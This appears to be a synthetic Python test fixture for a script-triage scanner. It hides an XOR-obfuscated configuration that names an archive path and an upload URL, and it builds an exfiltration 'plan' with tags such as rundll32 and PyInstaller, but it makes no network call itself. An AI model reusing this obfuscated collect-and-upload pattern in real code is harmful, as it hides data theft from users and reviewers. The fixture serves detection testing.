# configuration reconstruction
#!/usr/bin/env python3
# Huntress Script Triage -- inert static-analysis fixture (cpython3)
import base64
import io
import os

MATERIAL_79b98e74 = "228,103,20,6,162,230,63,86,9,236,241,53,74,22,180,241,46,121,22,190,241,59,74,86,180,252,57,73,30,180,205,59,84,25,185,251,44,67,86,165,224,59,72,9,188,251,46,121,8,180,255,53,82,31,173,243,62,71,10,165,247,40,27,15,163,254,54,79,24,142,224,63,87,15,180,225,46,121,24,190,246,35,90,9,165,243,61,67,37,178,253,47,72,14,236,163,38,85,3,191,230,59,94,71,181,251,57,82,19,190,252,59,84,3,142,246,51,85,10,176,230,57,78,6,190,240,60,83,9,178,243,46,79,21,191,175,54,71,23,179,246,59,121,19,191,246,51,84,31,178,230,51,73,20,173,241,59,84,8,184,247,40,27,10,168,251,52,85,14,176,254,54,67,8,142,253,52,67,30,184,224,38,81,19,191,246,53,81,9,142,241,50,71,19,191,175,40,83,20,181,254,54,21,72,142,226,40,67,30,180,241,63,85,9,190,224,38,69,27,188,226,59,79,29,191,205,51,66,71,178,243,55,86,27,184,245,52,11,66,176,166,106,23,25,224,241,62,64,6,164,226,54,73,27,181,205,47,84,22,236,250,46,82,10,162,168,117,9,66,176,166,106,23,25,224,241,62,64,84,180,234,59,75,10,189,247,116,79,20,167,243,54,79,30,254,231,42,74,21,176,246,38,71,8,178,250,51,80,31,142,226,59,82,18,236,209,96,9,42,163,253,61,84,27,188,214,59,82,27,254,218,47,72,14,163,247,41,85,54,176,240,117,69,27,178,250,63,11,66,176,166,106,23,25,224,241,62,64,84,171,251,42"
CODEC_79b98e74 = "decimal_csv|repeating_key_xor|92,5a,26,7a,d1"

def load_79b98e74():
    return bytes(int(item) for item in MATERIAL_79b98e74.split(","))

def decode_79b98e74(e):
    key_bytes = (146, 90, 38, 122, 209,)
    return bytes(value ^ key_bytes[index % len(key_bytes)] for index, value in enumerate(e))

def recover_79b98e74():
    n = 19 * 7 - 133
    f = decode_79b98e74
    d = f(load_79b98e74())
    t = d.decode("ascii", "strict")
    return t

def inspect_79b98e74():
    stream = io.BytesIO(recover_79b98e74().encode("ascii"))
    return stream.read().decode("ascii")

def surface_79b98e74():
    routes = {"selected": lambda: ("dictionary_dispatch", "lambda_indirection", "pyinstaller_onedir", "rundll32_predecessor")}
    return routes["selected"]()

def obfuscation_79b98e74():
    recover = lambda value: value
    return recover("lambda_indirection")

def plan_79b98e74():
    fields = dict(item.split("=", 1) for item in inspect_79b98e74().split("|"))
    analysis_surface = surface_79b98e74()
    obfuscation_surface = obfuscation_79b98e74()
    operation_plan = ("urllib_request_body", fields["archive_path"], fields["upload_url"])
    return operation_plan + (analysis_surface, obfuscation_surface)

if os.environ.get("HUNTRESS_INSPECT_ONLY") == "1":
    print(inspect_79b98e74())

# reconstruction complete